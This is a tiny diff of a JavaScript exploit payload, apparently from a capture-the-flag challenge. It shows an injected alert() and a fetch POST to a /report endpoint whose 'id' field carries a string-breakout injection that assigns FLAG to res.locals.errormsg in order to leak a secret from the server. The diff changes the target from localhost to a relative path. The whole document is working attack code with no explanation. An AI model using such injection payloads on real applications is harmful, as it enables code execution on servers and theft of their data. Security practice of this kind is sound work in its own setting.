@@ -1,6 +1,6 @@
 alert("injected");
 
-fetch("http://localhost/report", {
+fetch("/report", {
   method: "POST",
   body: new URLSearchParams({
     'id': '");res.locals.errormsg = FLAG;return;//'
